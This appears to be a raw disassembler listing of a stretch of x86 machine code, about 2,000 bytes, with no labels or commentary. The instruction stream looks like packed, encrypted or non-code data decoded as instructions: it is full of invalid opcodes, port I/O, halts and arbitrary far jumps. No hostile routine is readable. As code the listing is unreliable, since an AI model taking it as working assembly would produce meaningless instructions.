  408f5c:	pop    ds
  408f5d:	scas   eax,DWORD PTR es:[edi]
  408f5e:	inc    ebp
  408f5f:	and    al,0x33
  408f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f62:	ficom  WORD PTR [esi+0x12]
  408f65:	dec    ecx
  408f66:	dec    eax
  408f67:	pop    ebx
  408f68:	hlt    
  408f69:	aam    0x2d
  408f6b:	cdq    
  408f6c:	out    0x94,eax
  408f6e:	and    bh,BYTE PTR [ecx-0x1b]
  408f71:	jl     0x408efb
  408f73:	inc    edi
  408f74:	sbb    eax,0xda3b744b
  408f79:	ins    DWORD PTR es:[edi],dx
  408f7a:	add    ecx,DWORD PTR [edi+esi*4-0x27b99c69]
  408f81:	enter  0x80eb,0x6c
  408f85:	in     eax,dx
  408f86:	jecxz  0x408f73
  408f88:	mov    esp,0xf5babf80
  408f8d:	xchg   esi,eax
  408f8e:	cmp    eax,0x420d3884
  408f93:	inc    esi
  408f94:	imul   BYTE PTR [ebx]
  408f96:	cmp    eax,0x18d57836
  408f9b:	add    bh,BYTE PTR [eax+0x78c4fd3b]
  408fa1:	xchg   esp,eax
  408fa2:	aad    0x20
  408fa4:	rol    DWORD PTR [ebx],cl
  408fa6:	mov    cl,0x6f
  408fa8:	adc    BYTE PTR [edx-0xe],bl
  408fab:	cdq    
  408fac:	cmp    BYTE PTR [ebp+edx*1-0x22],0xb0
  408fb1:	add    eax,0x6d6c938c
  408fb6:	pop    edx
  408fb7:	pop    es
  408fb8:	or     cl,BYTE PTR [ecx]
  408fba:	add    eax,0xb16d3af4
  408fbf:	jmp    0x7d5a:0xe95a5076
  408fc6:	lea    edx,[ebp-0x616a2133]
  408fcc:	xor    al,0x9c
  408fce:	mov    ebp,0xfc0fae1c
  408fd3:	fs and eax,0x8a448399
  408fd9:	test   BYTE PTR [eax+ecx*2-0xb54e48a],cl
  408fe0:	sub    esp,ebx
  408fe2:	loope  0x408fd2
  408fe4:	lods   al,BYTE PTR ds:[esi]
  408fe5:	inc    edi
  408fe6:	mov    eax,0xdca17274
  408feb:	push   0x78
  408fed:	pushf  
  408fee:	imul   ebx,DWORD PTR [eax-0x63],0xc2801cfb
  408ff5:	push   ss
  408ff6:	fcmovbe st,st(0)
  408ff8:	lods   al,BYTE PTR ds:[esi]
  408ff9:	sub    BYTE PTR [edi+0x9],cl
  408ffc:	and    BYTE PTR [esi-0x9],dl
  408fff:	jns    0x409014
  409001:	dec    esi
  409002:	sbb    BYTE PTR [eax],bh
  409004:	sti    
  409005:	add    eax,0xb95b684e
  40900a:	and    eax,0x4c3bba9
  40900f:	or     ebp,DWORD PTR ds:0xd4829983
  409015:	push   ecx
  409016:	sbb    ch,ah
  409018:	push   eax
  409019:	sbb    DWORD PTR [ecx+0x75],eax
  40901c:	test   DWORD PTR [eax-0xc6d1e7],0x4ad33aa1
  409026:	mov    dh,0xee
  409028:	mov    ah,0x53
  40902a:	push   edi
  40902b:	mov    ebp,0x93f00da5
  409030:	cmp    dl,cl
  409032:	xchg   ecx,eax
  409033:	push   ebp
  409034:	pop    ebx
  409035:	dec    ecx
  409036:	push   ds
  409037:	sbb    eax,0x7601ca3c
  40903c:	popa   
  40903d:	clc    
  40903e:	xor    esp,esi
  409040:	mov    esi,0x4c102ca4
  409045:	dec    esp
  409046:	cmp    al,0x6a
  409048:	xor    eax,0x39a57580
  40904d:	xchg   DWORD PTR [esi-0x2992e951],eax
  409053:	mov    esi,0x825a954
  409058:	mov    ebx,0xc98fbc7a
  40905d:	pop    ebp
  40905e:	rcl    al,1
  409060:	js     0x4090a5
  409062:	into   
  409063:	jle    0x40904e
  409065:	xchg   BYTE PTR [edx-0x6011972],cl
  40906b:	push   es
  40906c:	retf   0x97bd
  40906f:	add    al,0xe9
  409071:	push   esp
  409072:	add    ecx,edi
  409074:	mov    al,ds:0x9c31d69e
  409079:	cwde   
  40907a:	ins    BYTE PTR es:[edi],dx
  40907b:	mov    DWORD PTR [esi-0x1f],ebp
  40907e:	mov    dl,0xa3
  409080:	pop    ecx
  409081:	les    edi,FWORD PTR [edi]
  409083:	push   cs
  409084:	lahf   
  409085:	cmp    BYTE PTR [esi-0x70],0xe8
  409089:	test   al,0x92
  40908b:	lds    esp,FWORD PTR [ecx+0x17ea34da]
  409091:	hlt    
  409092:	cmp    eax,0xf72a0a8d
  409097:	mov    ecx,0x6e30e95c
  40909c:	js     0x409071
  40909e:	mov    ebx,0xb81137c9
  4090a3:	aam    0x85
  4090a5:	mov    ds:0x6d66c432,eax
  4090aa:	adc    eax,0x3bef87ab
  4090af:	lock cmp al,0x23
  4090b2:	rcl    BYTE PTR [ebx+0x26],0xfb
  4090b6:	bound  ecx,QWORD PTR [edi-0x6632afa]
  4090bc:	loopne 0x409116
  4090be:	xor    ebx,edx
  4090c0:	push   esp
  4090c1:	ret    
  4090c2:	sub    al,0xba
  4090c4:	push   edx
  4090c5:	mov    ch,0x62
  4090c7:	and    al,0xe
  4090c9:	push   edx
  4090ca:	push   cs
  4090cb:	jecxz  0x4090e5
  4090cd:	and    al,BYTE PTR [edx-0x18]
  4090d0:	std    
  4090d1:	stos   DWORD PTR es:[edi],eax
  4090d2:	mov    al,ds:0x60aa74ed
  4090d7:	and    al,0xc2
  4090d9:	inc    esi
  4090da:	cmc    
  4090db:	mov    ch,ah
  4090dd:	idiv   DWORD PTR [edx+0x352aa7b]
  4090e3:	pop    esp
  4090e4:	hlt    
  4090e5:	bound  eax,QWORD PTR [eax]
  4090e7:	(bad)  
  4090e8:	mov    al,ds:0x277b1abe
  4090ed:	aad    0x7c
  4090ef:	and    ebp,0x4762c96
  4090f5:	cwde   
  4090f6:	cmp    BYTE PTR [edi],bl
  4090f8:	cmp    BYTE PTR [edx+0x69],bl
  4090fb:	loopne 0x4090d8
  4090fd:	jae    0x4090bf
  4090ff:	and    BYTE PTR [ecx+eiz*4+0x2a],ch
  409103:	xchg   edi,eax
  409104:	add    eax,0x5d3044a6
  409109:	jl     0x409098
  40910b:	push   esp
  40910c:	popa   
  40910d:	dec    ebp
  40910e:	and    DWORD PTR [ebx-0x44616129],0x21b33124
  409118:	(bad)  
  409119:	aaa    
  40911a:	arpl   WORD PTR [eax],cx
  40911c:	sub    DWORD PTR [ebx+0x7],ebx
  40911f:	xchg   esp,eax
  409120:	xchg   esi,eax
  409121:	add    DWORD PTR [esp+eiz*2-0x65],eax
  409125:	pop    esp
  409126:	xchg   edx,eax
  409127:	pop    ss
  409128:	ds pop ebp
  40912a:	jecxz  0x4091a2
  40912c:	and    al,0x29
  40912e:	ret    0xa370
  409131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409132:	xchg   esi,eax
  409133:	in     eax,0x4d
  409135:	dec    ebp
  409136:	stos   BYTE PTR es:[edi],al
  409137:	mov    al,ds:0x16f09773
  40913c:	dec    esp
  40913d:	mov    dl,0x2d
  40913f:	sbb    ebp,0xbac9c40c
  409145:	ficom  DWORD PTR [ebp-0x1f]
  409148:	ror    DWORD PTR [ebp-0x6b4f474],1
  40914e:	or     eax,0xabfe97d8
  409153:	fldcw  WORD PTR [ebx+0x2c0c31e2]
  409159:	sbb    eax,0xf3bb0e4c
  40915e:	scas   eax,DWORD PTR es:[edi]
  40915f:	jmp    0x409132
  409161:	lods   eax,DWORD PTR ds:[esi]
  409162:	(bad)  
  409163:	out    dx,al
  409164:	or     dh,cl
  409166:	pop    edx
  409167:	xor    esp,DWORD PTR [ebx+0x6]
  40916a:	aaa    
  40916b:	bnd jmp 0x4091d7
  40916e:	loope  0x40919c
  409170:	clc    
  409171:	inc    esp
  409172:	lock dec ebx
  409174:	sbb    dl,BYTE PTR [edx]
  409176:	fldenv [esi]
  409178:	xor    esp,DWORD PTR [esi+0x5d]
  40917b:	pop    es
  40917c:	enter  0xf588,0x5e
  409180:	sub    al,0x5c
  409182:	mov    edi,0xbea09e9
  409187:	fist   WORD PTR [esi]
  409189:	mov    ebp,DWORD PTR [ebp+0x63]
  40918c:	mov    bl,0x61
  40918e:	ror    BYTE PTR [edx+0x42ea29ed],1
  409194:	aad    0x84
  409196:	sbb    eax,ecx
  409198:	mov    dl,0xe7
  40919a:	jle    0x40911e
  40919c:	sub    bl,al
  40919e:	push   esi
  40919f:	push   ds
  4091a0:	jge    0x409194
  4091a2:	jb     0x409145
  4091a4:	call   0x2b22:0xc7a7f5da
  4091ab:	xchg   esp,eax
  4091ac:	leave  
  4091ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ae:	dec    ebp
  4091af:	dec    esp
  4091b0:	jge    0x4091d1
  4091b2:	sub    eax,0xbbd895f3
  4091b7:	lock mov dh,0xf
  4091ba:	xchg   edi,eax
  4091bb:	in     al,0x76
  4091bd:	iret   
  4091be:	push   ds
  4091bf:	and    bh,BYTE PTR gs:[eax+0x5105a905]
  4091c6:	scas   al,BYTE PTR es:[edi]
  4091c7:	push   ebx
  4091c8:	(bad)  
  4091c9:	lock mov dl,0x4d
  4091cc:	mov    ds:0x867ecc0,eax
  4091d1:	ret    
  4091d2:	test   DWORD PTR [esi+edi*8+0x41],edx
  4091d6:	ss and ecx,esp
  4091d9:	add    edi,DWORD PTR [eax]
  4091db:	(bad)  
  4091dc:	lock cmp al,0xc2
  4091df:	(bad)  
  4091e0:	fiadd  DWORD PTR [esi+0x2b]
  4091e3:	xor    al,0xc
  4091e5:	add    al,0x37
  4091e7:	xor    eax,0xdfcd6c09
  4091ec:	cmp    eax,0x3827e01d
  4091f1:	mov    BYTE PTR [esi-0x1],dl
  4091f4:	mov    WORD PTR [edi],ds
  4091f6:	add    ebp,DWORD PTR [ebp-0x42]
  4091f9:	test   eax,0x35baf003
  4091fe:	inc    ecx
  4091ff:	add    ch,ah
  409201:	adc    al,0x2e
  409203:	je     0x4091b4
  409205:	or     bh,BYTE PTR [ebx]
  409207:	mov    ds:0x5390d0ad,al
  40920c:	fmul   st(6),st
  40920e:	dec    BYTE PTR [esi+esi*8+0x32]
  409212:	cmp    bh,dh
  409214:	xor    ebx,DWORD PTR [ebx-0x78]
  409217:	jecxz  0x4091b6
  409219:	gs ins DWORD PTR es:[edi],dx
  40921b:	test   DWORD PTR [edi-0x61],ecx
  40921e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409220:	das    
  409221:	(bad)  
  409222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409223:	xchg   esp,eax
  409224:	lods   eax,DWORD PTR ds:[esi]
  409225:	jb     0x409298
  409227:	es push 0x39
  40922a:	push   ebp
  40922b:	ror    BYTE PTR [edx+edx*1-0x1986b903],cl
  409232:	hlt    
  409233:	xor    al,0x1d
  409235:	popa   
  409236:	jecxz  0x40926a
  409238:	xchg   DWORD PTR [esp+eiz*4-0x64069f1a],ecx
  40923f:	xlat   BYTE PTR ds:[ebx]
  409240:	loope  0x409262
  409242:	jmp    0x71b7:0xa9ea7e89
  409249:	pusha  
  40924a:	dec    edi
  40924b:	inc    esi
  40924c:	pop    edx
  40924d:	pop    edx
  40924e:	dec    ebp
  40924f:	es stos BYTE PTR es:[edi],al
  409251:	jmp    0xffa5:0x5e323ba9
  409258:	shl    DWORD PTR ds:0x1dcdde74,1
  40925e:	fsubrp st(5),st
  409260:	inc    edi
  409261:	push   eax
  409262:	stos   BYTE PTR es:[edi],al
  409263:	jb     0x40927b
  409265:	hlt    
  409266:	(bad)  
  409267:	dec    ecx
  409268:	add    DWORD PTR [esp+esi*4-0x7f82a843],esi
  40926f:	cmp    DWORD PTR [eax+edi*1-0x3b3e28e4],edi
  409276:	pop    esp
  409277:	xchg   ebx,eax
  409278:	xchg   BYTE PTR [edi+0x423a133f],cl
  40927e:	jae    0x409289
  409280:	pop    eax
  409281:	sub    bl,BYTE PTR [ecx+0x6a655692]
  409287:	adc    eax,0x868d182b
  40928c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40928d:	std    
  40928e:	sbb    al,0xed
  409290:	xor    BYTE PTR ds:0x20d93e90,al
  409296:	js     0x409245
  409298:	retf   
  409299:	push   es
  40929a:	popa   
  40929b:	fistp  QWORD PTR [eax+0x8173de]
  4092a1:	mov    eax,ds:0x19cd393e
  4092a6:	mov    ?,ebp
  4092a8:	inc    eax
  4092a9:	xor    DWORD PTR [ebp+0x44ae06cd],esp
  4092af:	outs   dx,BYTE PTR ds:[esi]
  4092b0:	xchg   edi,eax
  4092b1:	icebp  
  4092b2:	mov    esp,0x4d52916d
  4092b7:	adc    eax,0x61b160d5
  4092bc:	jge    0x4092d5
  4092be:	outs   dx,BYTE PTR ds:[esi]
  4092bf:	cmc    
  4092c0:	fcom   DWORD PTR [eax+esi*8-0x45]
  4092c4:	out    0xf6,al
  4092c6:	push   ebp
  4092c7:	mov    cl,0xe6
  4092c9:	call   0xcfde:0xcf04c4f9
  4092d0:	std    
  4092d1:	jle    0x4092a5
  4092d3:	pushf  
  4092d4:	mov    dl,0x9
  4092d6:	bound  ecx,QWORD PTR [eax+0x46]
  4092d9:	sti    
  4092da:	retf   0xb58c
  4092dd:	mov    ch,0xfa
  4092df:	ins    DWORD PTR es:[edi],dx
  4092e0:	cmc    
  4092e1:	adc    al,0x64
  4092e3:	jmp    0xb5b0221e
  4092e8:	adc    BYTE PTR [esi-0x22],ch
  4092eb:	xchg   edi,eax
  4092ec:	mov    eax,0x3e73fd83
  4092f1:	xor    ch,BYTE PTR [eax]
  4092f3:	pusha  
  4092f4:	das    
  4092f5:	or     eax,0x5c76c17d
  4092fa:	hlt    
  4092fb:	inc    esp
  4092fc:	gs stos DWORD PTR es:[edi],eax
  4092fe:	clc    
  4092ff:	pop    ebx
  409300:	(bad)  
  409301:	pusha  
  409302:	ret    
  409303:	sub    esp,DWORD PTR [eax+0x5]
  409306:	add    al,0x81
  409308:	loop   0x40932b
  40930a:	shl    DWORD PTR ds:0x8bc1004,1
  409310:	hlt    
  409311:	(bad)  
  409313:	add    al,0x7d
  409315:	sbb    al,0xde
  409317:	add    bh,ah
  409319:	gs ja  0x40929e
  40931c:	ret    0x195d
  40931f:	sbb    DWORD PTR [ecx],ebp
  409321:	and    ecx,DWORD PTR [edx-0x5d75a2eb]
  409327:	dec    ebp
  409328:	jge    0x409341
  40932a:	inc    ebp
  40932b:	sub    eax,0xf8ef57d4
  409330:	mov    ds:0xfb5e23ee,eax
  409335:	pop    ds
  409336:	push   ds
  409337:	lods   al,BYTE PTR ds:[esi]
  409338:	pop    esi
  409339:	mov    al,0x15
  40933b:	add    cl,BYTE PTR [eax]
  40933d:	sbb    cl,BYTE PTR ds:0xd36d211
  409343:	aam    0xeb
  409345:	sti    
  409346:	cmp    eax,DWORD PTR [ebx+ebx*8-0x9]
  40934a:	mov    ah,0xc7
  40934c:	je     0x4093b9
  40934e:	add    dh,BYTE PTR [esi-0xf]
  409351:	push   es
  409352:	stos   BYTE PTR es:[edi],al
  409353:	xor    ebp,DWORD PTR [ebp+0x49940dac]
  409359:	jb     0x40931a
  40935b:	ror    DWORD PTR [esi-0x23],1
  40935e:	mov    esp,0x77b45e5a
  409363:	out    dx,eax
  409364:	sbb    esi,ecx
  409366:	mov    esi,DWORD PTR [esi]
  409368:	test   al,0x41
  40936a:	inc    edi
  40936b:	retf   0xb926
  40936e:	adc    dh,BYTE PTR [esi-0x1574bf43]
  409374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409375:	jge    0x409343
  409377:	loopne 0x409304
  409379:	addr16 ss adc eax,0x4e5b1087
  409380:	leave  
  409381:	pop    edi
  409382:	out    dx,eax
  409383:	call   0xf4d5:0x5536107f
  40938a:	outs   dx,DWORD PTR ds:[esi]
  40938b:	jne    0x40934a
  40938d:	adc    dl,BYTE PTR [edx-0x80]
  409390:	jp     0x4093e8
  409392:	sub    al,0x4b
  409394:	sbb    DWORD PTR [edx],edx
  409396:	sar    DWORD PTR [ecx+0x7772ec29],cl
  40939c:	jg     0x40935f
  40939e:	adc    DWORD PTR [esi+0x65],esi
  4093a1:	xchg   edx,eax
  4093a2:	das    
  4093a3:	mov    ds:0x4aef5818,eax
  4093a8:	dec    ebp
  4093a9:	(bad)  
  4093aa:	pop    esi
  4093ab:	out    0x79,eax
  4093ad:	inc    ebp
  4093ae:	(bad)  
  4093af:	mov    bh,0x20
  4093b1:	shr    BYTE PTR [ecx],cl
  4093b3:	xor    ah,ch
  4093b5:	xchg   edi,eax
  4093b6:	xchg   ebx,eax
  4093b7:	cs out dx,al
  4093b9:	jge    0x4093f0
  4093bb:	dec    ecx
  4093bc:	xor    ebp,DWORD PTR [ecx+0x5786f188]
  4093c2:	sti    
  4093c3:	inc    ebx
  4093c4:	fmul   DWORD PTR [ebx+0x1ee4789c]
  4093ca:	retf   
  4093cb:	mov    edx,0xa55acd77
  4093d0:	jno    0x4093e0
  4093d2:	loop   0x409363
  4093d4:	jnp    0x4093d8
  4093d6:	xchg   esi,eax
  4093d7:	clc    
  4093d8:	shr    ch,0xba
  4093db:	adc    ebx,DWORD PTR [edi-0x16]
  4093de:	add    cl,bl
  4093e0:	xor    DWORD PTR [edi-0x36],ecx
  4093e3:	jae    0x409463
  4093e5:	out    dx,eax
  4093e6:	pop    edi
  4093e7:	or     ebp,DWORD PTR [esi+0xc]
  4093ea:	out    dx,eax
  4093eb:	fcom   st(7)
  4093ed:	enter  0x85d6,0xb0
  4093f1:	nop
  4093f2:	retf   0xfb57
  4093f5:	js     0x4093f2
  4093f7:	fcomp  DWORD PTR [eax]
  4093f9:	mov    eax,fs
  4093fb:	xchg   ebx,eax
  4093fc:	hlt    
  4093fd:	cmc    
  4093fe:	xchg   ebp,eax
  4093ff:	pop    esp
  409400:	dec    cx
  409402:	enter  0x6f9a,0x3b
  409406:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409407:	xchg   ebx,edi
  409409:	xchg   DWORD PTR [esi+0x42f77507],ebx
  40940f:	dec    eax
  409410:	pop    ecx
  409411:	shr    DWORD PTR [ebx-0x387a6862],cl
  409417:	ret    0xaede
  40941a:	in     al,dx
  40941b:	outs   dx,BYTE PTR ds:[esi]
  40941c:	test   eax,0xa6e195ed
  409421:	add    DWORD PTR [ebp+0x79],eax
  409424:	outs   dx,DWORD PTR ds:[esi]
  409425:	and    edi,edx
  409427:	mov    al,0x6a
  409429:	mov    ds:0x3447807d,al
  40942e:	sub    DWORD PTR [ebx-0x69479e08],ebx
  409434:	inc    esi
  409435:	lods   eax,DWORD PTR ds:[esi]
  409436:	(bad)  
  409437:	fstp   QWORD PTR [eax+0x79]
  40943a:	outs   dx,BYTE PTR ds:[esi]
  40943b:	inc    eax
  40943c:	mov    esp,DWORD PTR [ebx-0x71]
  40943f:	stos   DWORD PTR es:[edi],eax
  409440:	jl     0x4094ab
  409442:	mov    ecx,0x20c6c56a
  409447:	sub    DWORD PTR [eax+0x1bc79def],ecx
  40944d:	ja     0x409457
  40944f:	add    DWORD PTR gs:[edi+eax*8],eax
  409453:	xor    DWORD PTR [ebp+edx*8+0x44b6f964],ebp
  40945a:	inc    ebx
  40945b:	jne    0x4093de
  40945d:	adc    ah,BYTE PTR [edi+0x6e1f206c]
  409463:	ret    0xd797
  409466:	repz in al,0x89
  409469:	lods   eax,DWORD PTR ds:[esi]
  40946a:	in     al,dx
  40946b:	push   edi
  40946d:	mov    eax,0xa54b0358
  409472:	mov    dh,0x5c
  409474:	pop    es
  409475:	pop    ds
  409476:	add    ebp,esp
  409478:	fidiv  DWORD PTR [esi-0x31]
  40947b:	test   eax,0x1a373fe5
  409480:	imul   edx,DWORD PTR [esi+0x66],0x27df311
  409487:	add    eax,0xdd95ef05
  40948c:	daa    
  40948d:	and    DWORD PTR [eax-0x7d],edx
  409490:	inc    esi
  409491:	inc    eax
  409492:	mov    esp,DWORD PTR [esi-0x71]
  409495:	jb     0x40950f
  409497:	scas   al,BYTE PTR es:[edi]
  409498:	jbe    0x409473
  40949a:	sbb    ch,cl
  40949c:	jl     0x40945e
  40949e:	rcl    BYTE PTR [edi-0x6e268703],0xd9
  4094a5:	sub    edi,ebp
  4094a7:	cs pop eax
  4094a9:	loope  0x4094d0
  4094ab:	push   0x468461da
  4094b0:	or     al,BYTE PTR [ebp-0x49d4cfcd]
  4094b6:	sub    ebp,edx
  4094b8:	inc    ecx
  4094b9:	cmp    BYTE PTR [esi+0x2f],0x5
  4094bd:	in     al,0x56
  4094bf:	lods   eax,DWORD PTR ds:[esi]
  4094c0:	mov    ebx,0x8f944819
  4094c5:	inc    eax
  4094c6:	inc    ebx
  4094c7:	lahf   
  4094c8:	mov    ebx,0xdf709451
  4094cd:	ret    
  4094ce:	aaa    
  4094cf:	xchg   ecx,eax
  4094d0:	push   ebp
  4094d1:	call   0x6396:0x8c569282
  4094d8:	xchg   BYTE PTR [ecx],al
  4094da:	stc    
  4094db:	repnz mov WORD PTR [esi],ds
  4094de:	pop    ss
  4094df:	call   FWORD PTR [eax]
  4094e1:	out    dx,eax
  4094e2:	fucomi st,st(7)
  4094e4:	push   cs
  4094e5:	retf   
  4094e6:	mov    ch,0xbd
  4094e8:	push   edi
  4094e9:	repz pop eax
  4094eb:	nop
  4094ec:	pop    edi
  4094ed:	fisttp DWORD PTR ds:0x16cdce00
  4094f3:	or     eax,0xe72a6c60
  4094f8:	sbb    eax,0x5eef3e72
  4094fd:	add    eax,DWORD PTR [ecx+0x57]
  409500:	mov    ebp,0x8d7483aa
  409505:	lds    ecx,FWORD PTR [ecx]
  409507:	mov    bh,0x56
  409509:	popa   
  40950a:	xchg   edi,eax
  40950b:	jp     0x4094d8
  40950d:	and    al,0xa8
  40950f:	jg     0x40954a
  409511:	ror    bl,1
  409513:	or     DWORD PTR [edi],edi
  409515:	inc    ebx
  409516:	mov    esi,ebx
  409518:	push   ecx
  409519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40951a:	xchg   edi,eax
  40951b:	xor    eax,DWORD PTR [eax]
  40951d:	mov    BYTE PTR [edx],dl
  40951f:	jne    0x409557
  409521:	cli    
  409522:	xchg   ebx,eax
  409523:	inc    ebp
  409524:	xchg   ebp,eax
  409525:	in     eax,dx
  409526:	and    dh,BYTE PTR [edi]
  409528:	xchg   esi,eax
  409529:	ins    BYTE PTR es:[edi],dx
  40952a:	mov    eax,0xdbeaf89f
  40952f:	pop    es
  409530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409531:	push   edi
  409532:	sub    DWORD PTR [esi+edi*1-0x5b88b4d1],eax
  409539:	arpl   cx,cx
  40953b:	fidiv  WORD PTR [eax]
  40953d:	fstp   st(7)
  40953f:	es mov edx,0xa5ba5900
  409545:	test   BYTE PTR [eax-0x34945010],al
  40954b:	fnstsw WORD PTR [eax+0x24]
  40954e:	in     eax,0x9
  409550:	ror    esi,cl
  409552:	push   ebx
  409553:	mov    edi,0x1ac9eeb3
  409558:	sub    eax,0x449088b5
  40955d:	aad    0xf9
  40955f:	pop    ebp
  409560:	mov    dl,0xc5
  409562:	push   ds
  409563:	and    BYTE PTR [eax-0x7d06531b],al
  409569:	ss in  al,0xc3
  40956c:	mov    al,ds:0xb8df017f
  409571:	mov    bl,0x33
  409573:	into   
  409574:	jo     0x409579
  409576:	out    0x28,eax
  409578:	mov    ?,WORD PTR [edx+0x73]
  40957b:	cli    
  40957c:	inc    ebp
  40957d:	dec    eax
  40957e:	inc    esp
  40957f:	hlt    
  409580:	ss iret 
  409582:	push   cs
  409583:	std    
  409584:	xor    BYTE PTR [esi+ecx*1-0x56],ch
  409588:	mov    ch,0xc3
  40958a:	xchg   BYTE PTR [eax-0x80],ch
  40958d:	or     eax,0x816319b9
  409592:	sbb    BYTE PTR [ebx+eax*8-0x456f9b7a],dh
  409599:	js     0x409611
  40959b:	mov    ss:0x3a6818fe,eax
  4095a1:	popa   
  4095a2:	mov    al,0x5e
  4095a4:	hlt    
  4095a5:	sub    al,0x93
  4095a7:	pop    edx
  4095a8:	sbb    cl,bh
  4095aa:	push   cs
  4095ab:	adc    edx,DWORD PTR [edi]
  4095ad:	and    ebp,DWORD PTR [ecx-0x1495d9af]
  4095b3:	push   eax
  4095b4:	push   edi
  4095b5:	xchg   esi,eax
  4095b6:	xchg   edi,eax
  4095b7:	jae    0x409607
  4095b9:	repz sub al,0xc5
  4095bc:	test   eax,0xf1f1d829
  4095c1:	test   BYTE PTR [ebx+0x47],dl
  4095c4:	repz pop eax
  4095c6:	jg     0x4095b9
  4095c8:	mov    ch,0x42
  4095ca:	cmp    eax,0x650cb467
  4095cf:	stc    
  4095d0:	outs   dx,DWORD PTR ds:[esi]
  4095d1:	adc    eax,0xaf283bf8
  4095d6:	leave  
  4095d7:	mov    ecx,?
  4095d9:	lods   eax,DWORD PTR ds:[esi]
  4095da:	push   esi
  4095db:	push   eax
  4095dc:	xor    eax,0xe205f51
  4095e1:	pop    eax
  4095e2:	push   0x972bc90d
  4095e7:	retf   
  4095e8:	repz add eax,DWORD PTR [edi]
  4095eb:	jl     0x409662
  4095ed:	push   esi
  4095ee:	sbb    al,0xc2
  4095f0:	pop    ebp
  4095f1:	sbb    al,0x93
  4095f3:	or     ecx,DWORD PTR ds:0xafb006ab
  4095f9:	adc    DWORD PTR [eax*8+0x724a33be],ecx
  409600:	push   ss
  409601:	test   eax,0xb5edf15d
  409606:	in     al,dx
  409607:	outs   dx,DWORD PTR ds:[esi]
  409608:	sti    
  409609:	retf   0x9321
  40960c:	js     0x409662
  40960e:	cld    
  40960f:	jns    0x4095d9
  409611:	das    
  409612:	and    edi,DWORD PTR [ebx-0x4ff11aac]
  409618:	xchg   ecx,eax
  409619:	ret    0x9182
  40961c:	inc    esp
  40961d:	jns    0x40964e
  40961f:	in     al,0xd
  409621:	mov    al,0x5
  409623:	and    al,0x86
  409625:	pop    ecx
  409626:	mov    bl,ah
  409628:	aam    0xa9
  40962a:	mov    bh,0x69
  40962c:	inc    ecx
  40962d:	sbb    esp,edi
  40962f:	pop    eax
  409630:	mov    eax,DWORD PTR [ecx+0x5e]
  409633:	adc    eax,0x874e7793
  409638:	jge    0x4095cc
  40963a:	test   al,0xac
  40963c:	mov    bl,BYTE PTR [edi-0x5fc1a8ca]
  409642:	adc    eax,0x28cbed4f
  409647:	data16 aas 
  409649:	mov    dl,0x37
  40964b:	jg     0x4095ee
  40964d:	(bad)  
  40964e:	call   0x4e21:0xd7763bab
  409655:	xor    ch,al
  409657:	adc    DWORD PTR [edi+0x3f8abdab],0xffffff8c
  40965e:	dec    ebx
  40965f:	gs pop ebp
  409661:	push   esi
  409662:	dec    eax
  409663:	loopne 0x4096d7
  409665:	jmp    0x40963a
  409667:	arpl   WORD PTR [eax+0x611d5eed],ax
  40966d:	sahf   
  40966e:	inc    edi
  40966f:	out    0x7b,al
  409671:	xchg   esp,eax
  409672:	in     eax,dx
  409673:	inc    esi
  409674:	popa   
  409675:	mov    ds:0xbc1cdc36,eax
  40967a:	mov    bh,0x7a
  40967c:	push   eax
  40967d:	pop    ds
  40967e:	xor    BYTE PTR [esi],bh
  409680:	lods   eax,DWORD PTR ds:[esi]
  409681:	jmp    0xbac:0x4831b94d
  409688:	in     al,dx
  409689:	int3   
  40968a:	mov    ebx,0xc2ad6712
  40968f:	cs repnz int3 
  409692:	push   edi
  409693:	mov    ch,0xf8
  409695:	clc    
  409696:	and    al,0x62
  409698:	xor    esi,DWORD PTR [eax+eax*8]
  40969b:	push   0xa4c20e42
  4096a0:	xchg   ebp,eax
  4096a1:	daa    
  4096a2:	outs   dx,BYTE PTR ds:[esi]
  4096a3:	in     eax,0x36
  4096a5:	inc    eax
  4096a6:	aam    0xa9
  4096a8:	mul    BYTE PTR [ecx+0x45312c1d]
  4096ae:	clc    
  4096af:	inc    edx
  4096b0:	push   es
  4096b1:	inc    ebx
  4096b2:	sub    DWORD PTR [ebx-0x2697143a],0xac200e18
  4096bc:	jb     0x4096fb
  4096be:	sbb    dl,BYTE PTR [esi-0x65]
  4096c1:	adc    DWORD PTR cs:[ecx-0x6f],0x26
  4096c6:	ja     0x409738
  4096c8:	adc    edx,DWORD PTR [edi+0x754d4672]
  4096ce:	cmp    dh,dh
  4096d0:	dec    eax
  4096d1:	into   
  4096d2:	xor    edx,DWORD PTR [ebx-0x35]
  4096d5:	xor    eax,0xee903071
  4096da:	xchg   edx,eax
  4096db:	icebp  
  4096dc:	inc    ebp
  4096dd:	inc    ecx
  4096de:	xchg   ecx,eax
  4096df:	cmp    DWORD PTR [edx+edx*2],esi
  4096e2:	imul   edi,DWORD PTR [ecx],0x6275db1e
  4096e8:	push   0xe4a7c055
  4096ed:	jb     0x409688
  4096ef:	xchg   esi,eax
  4096f0:	sahf   
  4096f1:	loopne 0x409721
  4096f3:	push   esi
  4096f4:	dec    ebp
  4096f5:	or     al,ch
  4096f7:	jb     0x4096bf
  4096f9:	(bad)  
  4096fa:	sahf   
  4096fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fc:	sahf   
  4096fd:	daa    
  4096fe:	adc    dl,BYTE PTR [eax]
  409700:	dec    esi
  409701:	adc    DWORD PTR [ecx],ecx
  409703:	mov    dh,0x4f
  409705:	inc    eax
  409706:	or     eax,0x3bf298a
  40970b:	call   0xc4fd:0x8ab28a8e
  409712:	cdq    
  409713:	pop    esi
  409714:	lea    esi,[eax-0x57]
  409717:	dec    edi
  409718:	sahf   
  409719:	fidivr DWORD PTR [ebp-0x65]
  40971c:	push   esp
  40971d:	or     eax,DWORD PTR [edx-0x140fd4bf]
  409723:	adc    dl,BYTE PTR [ebx-0x4fd1fa5d]
  409729:	pop    ss
  40972a:	div    DWORD PTR [edx+0x40]
  40972d:	aam    0xa5
  40972f:	jno    0x409717
  409731:	call   0x32ae:0x4f65cdf0
